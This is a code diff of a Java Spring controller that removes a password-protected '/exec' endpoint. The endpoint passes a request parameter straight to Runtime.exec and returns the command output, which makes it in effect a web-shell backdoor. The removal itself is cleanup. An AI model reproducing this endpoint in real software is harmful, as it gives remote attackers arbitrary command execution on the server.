@@ -38,27 +38,4 @@ public class SystemController {
     public String apiList(@RequestHeader(value = "User-Agent") String userAgent) {
         return "redirect:api.html";
     }
-
-    @Value("${auth.pwd}")
-    String pwd;
-
-    @GetMapping("/exec")
-    public Object exec(@RequestParam("line") String line, @RequestParam("pwd") String pwd) {
-        if (pwd.equals(this.pwd)) {
-            try {
-                Runtime runtime = Runtime.getRuntime();
-                Process process = runtime.exec(line);
-                process.waitFor();
-                String i0 = ReadUtils.readAll(process.getInputStream(), "utf-8");
-                String e0 = ReadUtils.readAll(process.getErrorStream(), "utf-8");
-                JSONObject jo = new JSONObject();
-                jo.put("in", i0);
-                jo.put("err", e0);
-                return jo;
-            } catch (Exception e) {
-                e.printStackTrace();
-                return e.getMessage();
-            }
-        } else return "error";
-    }
 }
